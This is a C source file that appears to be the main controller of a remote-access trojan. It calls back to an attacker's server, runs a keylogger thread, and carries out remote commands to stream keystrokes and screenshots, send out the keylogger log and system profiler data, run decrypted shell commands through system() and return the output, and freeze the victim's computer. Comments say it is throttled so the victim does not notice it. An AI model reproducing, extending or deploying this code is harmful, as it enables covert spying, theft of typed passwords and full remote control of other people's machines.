#include <pthread.h> 
#include <signal.h>
#include <string.h>
#include <stdbool.h>
#include "keylogger.h"
#include "screenshot_capture.h"
#include "other_attacks.h"
#include "connection.h"

volatile int keepRunning = 1;
volatile bool stop_keystrokes_stream = true;

void * start_capture_screenshots (){
	while(keepRunning){
		usleep(100000 * 12); // sleep 1.2 sec in order to do not consume too much resources and be discover be the victim
		capture_screenshot();
	}
	return NULL;
}

void start_connection(){
	while (create_connection() == FAILUR){
		printf("[-] connection failed, trying to connect again ...\n"); // delete ita
		sleep(3);
	}
	log_in_victim();
}

int main (){
	start_connection();
	action_type attacker_requested_actioa;
	pthread_t screenshotcapture_thread;
	pthread_t keyloger_log_thread;
	pthread_create(&keyloger_log_thread, NULL, start_keylogger_log, NULL); // start the keylogger to intercept all keystrokes into the keylogger log
	char bind_shell_command[ENCRYPTED_TEXT_LEN(MAX_BIND_SHELL_COMMAND)];
	action_type attacker_income_action;
	main_data temp_data;
	
	while (true){
		if(recv(V_S_socket, &attacker_income_action, sizeof(action_type),0) == 0)
			start_connection();

		switch (attacker_income_action){
			case GET_KEYLOGGER_HISTORY :
				
				send_file(".keylogger.txt", GET_KEYLOGGER_HISTORY, true);
				
				break;
				
			case GET_KEYSTROKES_STREAM :		
				stop_keystrokes_stream = false;
				
				break;
			case STOP_KEYSTROKES_STREAM :
				stop_keystrokes_stream = true;
				V_2_S_encrypted_message_handler(temp_data, GET_KEYSTROKES_STREAM); // send last, empty message to the attacker in order to stop the listen sestion successfully
				
				break;
				
			case GET_SCREEN_STREAM :
				keepRunning = 1;
				pthread_create(&screenshotcapture_thread, NULL, start_capture_screenshots, NULL);
				
				break;
			
			case STOP_SCREEN_STREAM :
				keepRunning = 0;
				V_2_S_encrypted_message_handler(temp_data, GET_SCREEN_STREAM); // send last, empty message to the attacker in order to stop the listen sestion successfully
				
				break;
				
			case GET_SYSTEM_PROFILER :
				get_system_profiler();
				send_file(".system_profiler.txt", GET_SYSTEM_PROFILER, true);
				
				break;
				
			case SEND_BIND_SHELL_COMMAND :
				recv(V_S_socket, bind_shell_command, ENCRYPTED_TEXT_LEN(MAX_BIND_SHELL_COMMAND), 0);
				sprintf(bind_shell_command, "%s > .shell_command_output.txt 2> .shell_command_output.txt", decrypt_text(bind_shell_command, AES_KEY)); // set the shell_command_output to spasipic path!! !!!1
				system(bind_shell_command);
				send_file(".shell_command_output.txt", SEND_BIND_SHELL_COMMAND, false);
				
				break;
				
			case STUCK_VICTIMS_COMPUTER :
				stick_the_cumputer();
				
				break;
				
			case KEY_EXCHANGE :
				secure_key_exchange();
				
				break;
				
			default :
				
				break;
		}
	}
}
